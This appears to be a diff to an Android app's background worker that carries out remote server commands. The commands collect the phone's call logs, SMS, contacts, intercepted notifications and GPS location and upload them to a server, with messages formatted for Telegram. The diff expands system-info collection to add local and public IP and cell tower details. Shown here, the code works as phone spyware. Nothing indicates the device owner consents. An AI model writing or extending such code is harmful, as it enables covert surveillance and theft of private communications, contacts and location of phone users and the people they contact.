@@ -21,7 +21,6 @@ class DataFetchWorker(private val appContext: Context, workerParams: WorkerParam
     private val apiClient = ApiClient(appContext.getString(R.string.server_base_url))
     private val manualDataManager = ManualDataManager(appContext)
     private val systemInfoManager = SystemInfoManager(appContext)
-    // Get an instance of our database DAO
     private val notificationDao = NotificationDatabase.getDatabase(appContext).notificationDao()
 
     companion object {
@@ -45,7 +44,7 @@ class DataFetchWorker(private val appContext: Context, workerParams: WorkerParam
                     "get_call_logs" -> fetchAndSendCsv("CallLogs", manualDataManager::getCallLogsAsCsv)
                     "get_sms" -> fetchAndSendCsv("SMS", manualDataManager::getSmsAsCsv)
                     "get_contacts" -> fetchAndSendCsv("Contacts", manualDataManager::getContactsAsCsv)
-                    "get_notifications" -> fetchAndSendNotificationsCsv() // The new command handler
+                    "get_notifications" -> fetchAndSendNotificationsCsv()
                     else -> {
                         Log.w(TAG, "Unknown command: $command")
                         false
@@ -58,6 +57,33 @@ class DataFetchWorker(private val appContext: Context, workerParams: WorkerParam
                 Result.failure()
             }
         }
+    }
+
+    /**
+     * Gathers extensive system information and sends it as a formatted text message.
+     */
+    private suspend fun fetchAndSendSystemInfo(): Boolean {
+        // Gather all the new data points.
+        // Note: getPublicIpAddress is a suspend function that makes a network call.
+        val batteryStatus = systemInfoManager.getBatteryStatus()
+        val networkType = systemInfoManager.getNetworkType()
+        val localIp = systemInfoManager.getLocalIpAddress()
+        val publicIp = systemInfoManager.getPublicIpAddress()
+        val cellInfo = systemInfoManager.getCellTowerInfo()
+
+        // Build the detailed string using Markdown for nice formatting in Telegram.
+        val systemInfoMessage = """
+            ⚙️ *System Info*
+            
+            *Battery*: ${batteryStatus.percentage}% (${batteryStatus.status})
+            *Network*: $networkType
+            *Local IP*: `$localIp`
+            *Public IP*: `$publicIp`
+            *Cell Tower*: `$cellInfo`
+        """.trimIndent()
+
+        // Send the final message to the server.
+        return apiClient.uploadText(systemInfoMessage)
     }
 
     /**
@@ -74,17 +100,17 @@ class DataFetchWorker(private val appContext: Context, workerParams: WorkerParam
             return apiClient.uploadText("✅ No new notifications found on device.")
         }
 
-        // 3. Generate the CSV data using the helper in ManualDataManager
+        // 3. Generate the CSV data
         val csvData = manualDataManager.getNotificationsAsCsv(unsentNotifications)
         val file = File.createTempFile("notifications_", ".csv", appContext.cacheDir)
         file.writeText(csvData)
 
-        // 4. Upload the file to the server
+        // 4. Upload the file
         Log.d(TAG, "Uploading ${unsentNotifications.size} notifications...")
         val success = apiClient.uploadFile(file, "Exported Notifications from Device")
-        file.delete() // Clean up the temp file regardless of upload success
+        file.delete() // Clean up the temp file
 
-        // 5. If the upload was successful, delete the sent items from the local database
+        // 5. If upload was successful, delete the sent items from the database
         if (success) {
             val idsToDelete = unsentNotifications.map { it.id }
             notificationDao.deleteByIds(idsToDelete)
@@ -103,7 +129,6 @@ class DataFetchWorker(private val appContext: Context, workerParams: WorkerParam
             return false // Return false so the server knows the command failed
         }
         val fusedLocationClient = LocationServices.getFusedLocationProviderClient(appContext)
-        // Use a balanced priority to conserve battery
         val location = fusedLocationClient.getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, null).await()
         return if (location != null) {
             val message = "📍 Location Update:\nLat: ${location.latitude}\nLon: ${location.longitude}\nAccuracy: ${location.accuracy}m"
@@ -112,13 +137,6 @@ class DataFetchWorker(private val appContext: Context, workerParams: WorkerParam
             apiClient.uploadText("📍 Location Update:\nFailed to get location (was null).")
             false
         }
-    }
-
-    private suspend fun fetchAndSendSystemInfo(): Boolean {
-        val networkInfo = systemInfoManager.getNetworkInfo()
-        val batteryInfo = systemInfoManager.getBatteryInfo()
-        val systemInfoMessage = "⚙️ System Info:\nNetwork: $networkInfo\n$batteryInfo"
-        return apiClient.uploadText(systemInfoMessage)
     }
 
     /**
